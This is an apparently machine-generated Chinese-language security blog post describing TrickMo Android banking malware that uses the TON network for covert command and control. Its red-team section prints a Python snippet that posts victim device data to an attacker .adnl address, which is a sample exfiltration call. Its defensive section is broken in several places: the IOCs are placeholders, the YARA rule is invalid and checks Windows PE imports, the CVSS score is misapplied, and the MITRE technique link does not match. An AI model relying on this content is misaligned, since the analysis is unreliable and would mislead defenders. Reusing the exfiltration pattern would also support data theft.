---
layout: post
title:  "TrickMo Android banker adopts TON blockchain for covert comms"
date:   2026-05-11 09:29:16 +0000
categories: [security]
severity: high
---

# 🔥 解析 TrickMo Android Banking Malware 的 TON 基於命令和控制通訊

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.8)
> * **受駭指標**: Banking and cryptocurrency wallets of users in France, Italy, and Austria
> * **關鍵技術**: TON (The Open Network), .ADNL addresses, decentralized peer-to-peer network

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: TrickMo Android banking malware 使用 TON 基於命令和控制通訊，允許攻擊者隱藏其真實 IP 地址和通信端口。
* **攻擊流程圖解**: 
  1. 攻擊者將 TrickMo 惡意軟件發送給受害者。
  2. 受害者安裝惡意軟件後，TrickMo 會與 TON 網絡進行通信。
  3. TON 網絡使用 .ADNL 地址和加密的 overlay 網絡，隱藏攻擊者的真實 IP 地址和通信端口。
* **受影響元件**: Android 9.0 以上版本，使用 TON 網絡的應用程序。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有 TON 網絡的訪問權限和受害者的設備信息。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # TON 網絡 API
    ton_api = "https://api.ton.network"
    
    # 攻擊者 .ADNL 地址
    adnl_address = "example.adnl"
    
    # 受害者設備信息
    device_info = {
        "device_id": "example_device_id",
        "device_type": "android"
    }
    
    # Payload 結構
    payload = {
        "adnl_address": adnl_address,
        "device_info": device_info
    }
    
    # 發送 Payload
    response = requests.post(ton_api, json=payload)
    
    ```
* **繞過技術**: 攻擊者可以使用 TON 網絡的加密和隱藏功能來繞過傳統的安全防護措施。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| example_hash | 192.168.1.100 | example.com | /example/file |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule TrickMo_Malware {
      meta:
        description = "TrickMo Android banking malware"
        author = "example_author"
      strings:
        $adnl_address = ".adnl"
      condition:
        $adnl_address in (pe.imports[0].name)
    }
    
    ```
* **緩解措施**: 使用 TON 網絡的應用程序應該進行嚴格的安全審查和測試，以確保其安全性。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **TON (The Open Network)**: 一種去中心化的點對點網絡，允許設備之間進行加密的通信。
* **.ADNL (Advanced Distributed Network Layer)**: TON 網絡使用的地址格式，允許設備之間進行隱藏的通信。
* **Decentralized peer-to-peer network**: 一種去中心化的點對點網絡，允許設備之間直接進行通信，而不需要中央伺服器。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/trickmo-android-banker-adopts-ton-blockchain-for-covert-comms/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1046/)


